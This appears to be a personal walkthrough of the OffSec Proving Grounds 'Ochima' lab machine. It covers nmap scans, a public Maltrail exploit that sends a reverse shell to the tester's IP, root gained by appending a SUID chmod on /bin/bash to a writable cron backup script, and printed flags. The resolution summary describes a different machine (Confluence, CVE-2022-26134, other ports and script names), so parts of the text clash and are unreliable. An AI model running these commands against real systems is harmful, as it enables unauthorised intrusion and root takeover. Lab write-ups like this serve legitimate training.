---
Date: 2024-10-13
Platform: PG-Practice
Category: Linux
Difficulty: Intermediate
Status: Complete
IP: 192.168.117.32
Writeup: https://medium.com/@0xrave/ctf-200-01-offsec-proving-grounds-practice-labor-day-ctf-machine-walkthrough-702633e20940
---
# Ochima
This one was an exercise in frustration purely because the exploit didn't seem to work on the port I wanted it to (`4444`) but *would* work on port `80`!? 

I tired all sorts of things to get it work, the walkthroughs didn't explain why they used port 80, and the exploit itself indicated it'd work on whatever I picked... but the moment I popped port 80 into the exploit's reverse shell parameters I got an incoming connection. So an important reminder that if a reverse shell isn't working on port `4444` then try the same thing but with a listener on port `80` instead

Once I had initial access, privilege escalation wasn't hugely complicated - I spotted the `.tar` backup file pretty quickly, and after running `linpeas.sh` I saw the `etc_Backups.sh` script too. Part of me worried that I'd need to find a way to execute the script if it wasn't scheduled, or that I wouldn't have write access, but after checking with `ls -lah` I saw it was wide open, and I could have uploaded `pspy` to see if it was running too.

All round a bit frustrating to lean on a walkthrough to figure out initial access, but the walkthrough didn't help much anyway - it just told me the exploit *could* work, and it took me realising the walkthroughs both happened to use port 80 before I tried it myself.

**Note**: My initial `nmap` scan didn't show up port `8338`, so this was an important reminder to run a wider and more aggressive scan if there's no obvious way forward (or just start by running `sudo nmap -p- -T5 192.168.xx.xxx -v` followed by an aggressive port specific scan)

**Note2**: Don't forget to scan UDP if the TCP scan doesn't show much - most of the time you'll find nothing, but if you do it'll be a big deal.
# Resolution summary
- Ran Nmap to identify ports `22` & `8080`
- Visited http (`8090`) & identified `Confluence v7.13.6`
- Identified exploit for CVE-2022-26134 and ran against target for reverse shell
- Uploaded `pspy` and identified `log-backup.sh` being run regularly by `root`
- Added command to change `/bin/bash` SUID and waited for script to run
- Ran `/bin/bash -p` to become `root`
## Improved skills
- Linux Privilege Escalation
- Handling reverse shells
## Used tools
- nmap
- python
- linpeas.sh

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -Pn -n 192.168.117.32 -sC -sV -p- --open -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
8338/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: Maltrail/0.52
|     Date: Sun, 13 Oct 2024 07:41:59 GMT
|     Connection: close
|     Content-Type: text/html
|     Last-Modified: Sat, 31 Dec 2022 22:58:57 GMT
|     Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * blob:; script-src 'self' 'unsafe-eval' https://stat.ripe.net; frame-src *; object-src 'none'; block-all-mixed-content;
|     Cache-Control: no-cache
|     Content-Length: 7091
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta http-equiv="Content-Type" content="text/html;charset=utf8">
|     <meta name="viewport" content="width=device-width, user-scalable=no">
|     <meta name="robots" content="noindex, nofollow">
|     <title>Maltrail</title>
|     <link rel="stylesheet" type="text/css" href="css/thirdparty.min.css">
|     <link rel="stylesheet" type="text/css" hre
|   HTTPOptions: 
|     HTTP/1.0 501 Unsupported method ('OPTIONS')
|     Server: Maltrail/0.52
|     Date: Sun, 13 Oct 2024 07:41:59 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data.
```
---
# Enumeration
## Port 22 - SSH (OpenSSH 8.9p1)
No enumeration conducted
## Port 80 - HTTP (Apache 2.4.52)
- Navigated to `http://192.168.117.32:80` and identified `Apache2 Defauly Page`
![[Pasted image 20241013175715.png]]
- Ran `gobuster dir -u http://192.168.117.32 -w //usr/share/dirb/wordlists/big.txt` to enumerate web directories
![[Pasted image 20241013180308.png]]
## Port 8338 - HTTP (Apache 2.4.52)
- Navigated to `http://192.168.117.32:80` and identified `Maltrail v.052`
![[Pasted image 20241013181247.png]]
	- Potentially vulnerable to CVE-2023–27163
---
# Exploitation
- Identified exploit `Maltrail-RCE.py` from https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py - copied to local host 
- Setup Netcat listener on port `80` then ran `python3 Maltrail-RCE.py 192.168.45.250 80 http://192.168.117.32:8338` to catch reverse shell as user `snort`
![[Pasted image 20241013190836.png]]
---
# Lateral Movement to user
## Local Enumeration
- Ran `cat /home/snort/local.txt` to print `a00aea52796dcd16e3d4e840f16bd277`
![[Pasted image 20241013190954.png]]
- Ran `cat /etc/passwd` to enumerate users
![[Pasted image 20241013191808.png]]
- Ran `sudo -l` and found `sudo` requires `snort` password
![[Pasted image 20241013191909.png]]
- Uploaded & ran `linpeas.sh`
![[Pasted image 20241013193004.png]]
- Identified interesting files
![[Pasted image 20241013193341.png]]
- Identified possible private SSH keys
![[Pasted image 20241013193432.png]]
- Identified interesting writeable files including `/var/backups/etc_Backup.sh`
![[Pasted image 20241013193641.png]]
---
# Privilege Escalation
- Ran `ls -lah /var/backups/etc_Backup.sh` to identify script privileges
![[Pasted image 20241013194807.png]]
- Ran `echo "chmod +s /bin/bash" >> /var/backups/etc_Backup.sh` to add command to script to change set privileges for `/bin/bash`
![[Pasted image 20241013195006.png]]
- Waited a few minutes for script, then ran `/bin/bash -p` to achieve `root`
![[Pasted image 20241013195139.png]]
- Ran `cat /root/proof.txt` to print `8f730f4db61f48dd3810007f95fa9e61`
![[Pasted image 20241013195335.png]]
---
# Trophy & Loot
`local.txt` = `a00aea52796dcd16e3d4e840f16bd277`
`root.txt` = `8f730f4db61f48dd3810007f95fa9e61`